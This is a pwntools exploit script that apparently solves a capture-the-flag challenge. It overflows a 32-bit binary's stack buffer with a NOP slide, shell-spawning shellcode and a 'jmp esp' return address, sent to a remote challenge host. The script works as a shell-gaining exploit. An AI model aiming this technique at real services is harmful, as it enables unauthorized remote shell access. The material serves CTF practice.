from pwn import *

# Set the architecture and context
context.arch = 'i386'
context.os = 'linux'
context.bits = 32

# Start the target process (local or remote)
# p = process('./restricted_shell')  # Local process
p = remote('shell.challs.cyberchallenge.it', 9123)  # Uncomment for remote exploitation

# Attach GDB to the process with b at: 1.0x08048593 (jmp esp) and 2. 0x08048533 (exit)
# gdb.attach(p, gdbscript='''
# b *0x08048593 
# b *0x08048533
# c           
# ''')
# gdb.attach(p)

# Define the buffer size (40 bytes for buffer + 4 bytes for saved EBP)
buf_size = 40
saved_ebp_size = 4

# Generate shellcode for spawning a shell
shellcode = asm(shellcraft.sh())

print(f"Shellcode length: {len(shellcode)}")

# Calculate the NOP slide size (buffer size - shellcode length)
nop_slide = b'\x90' * (buf_size - len(shellcode))

# Address of `jmp esp` (overwrite return address)
addr = 0x08048593

# Construct the payload
payload = nop_slide + shellcode + p32(addr) + shellcode

# Print payload information for debugging
print(f"Payload length: {len(payload)}")
print(f"Payload: {payload}")

# Send the payload to the target process
p.sendline(payload)

# Interact with the process to maintain the shell
p.interactive()
